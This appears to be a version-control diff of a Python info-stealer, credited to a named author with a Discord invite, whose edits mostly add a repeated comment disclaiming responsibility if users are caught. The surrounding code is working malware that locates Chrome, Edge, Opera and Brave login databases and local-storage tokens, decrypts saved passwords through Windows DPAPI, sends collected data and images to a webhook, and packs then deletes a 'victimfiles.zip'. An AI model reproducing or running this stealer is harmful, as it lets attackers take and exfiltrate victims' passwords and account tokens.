@@ -4,6 +4,7 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.backends import default_backend
 from Crypto.Cipher import AES
 
+# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 from base64 import b64decode, b64encode
 from dhooks import Webhook, Embed, File
@@ -23,7 +24,7 @@ import os
 from sys import argv
 import ctypes
 
-# last version , 3/18/21 by msr#6536
+# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 DBP = r'Google\Chrome\User Data\Default\Login Data'
 EBP = r'Microsoft\Edge\User Data\Default\Login Data'
@@ -31,6 +32,7 @@ OBP = r'\Opera Software\Opera Stable'
 BBP = r'\BraveSoftware\Brave-Browser\User Data\Default\Login Data'
 ADP = os.environ['LOCALAPPDATA']
 
+# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 def sniff(path):
     path += '\\Local Storage\\leveldb'
@@ -56,6 +58,7 @@ def encrypt(cipher, plaintext, nonce):
     ciphertext = encryptor.update(plaintext)
     return (cipher, ciphertext, nonce)
 
+# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 def decrypt(cipher, ciphertext, nonce):
     cipher.mode = modes.GCM(nonce)
@@ -67,6 +70,7 @@ def rcipher(key):
     cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
     return cipher
 
+# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 def dpapi(encrypted):
     import ctypes
@@ -87,6 +91,7 @@ def dpapi(encrypted):
     ctypes.windll.kernel32.LocalFree(blobout.pbData)
     return result
 
+# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 def localdata():
     jsn = None
@@ -94,6 +99,7 @@ def localdata():
         jsn = json.loads(str(f.readline()))
     return jsn["os_crypt"]["encrypted_key"]
 
+# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 def decryptions(encrypted_txt):
     encoded_key = localdata()
@@ -129,6 +135,7 @@ class chrome:
             self.passwordList.append(_info)
         conn.close()
         os.remove(db_file)
+# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
     def cdecrypt(self, encrypted_txt):
         if sys.platform == 'win32':
@@ -159,7 +166,8 @@ if __name__ == "__main__":
         pass
     main.saved()
 
-# webhook functionality => collect rest of specified data, send it to our webhook
+# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+
 def upload():
     try:
         """create a randomized name for uploading purposes : removes the possibility of repeat images being embedded"""
@@ -179,7 +187,8 @@ def upload():
         return image
     except:
         pass
-# webhook functionality => collect rest of specified data, send it to our webhook
+# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
+
 def uploadwc():
     try:
         """create a randomized name for uploading purposes : removes the possibility of repeat images being embedded"""
@@ -349,5 +358,6 @@ def beamed():
         subprocess.os.system(r'del C:\ProgramData\victimfiles.zip')
     except:
         pass
+# last version , 3/18/21 by msr#6536 , #gotcha-medium program by msr#6536 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 beamed()
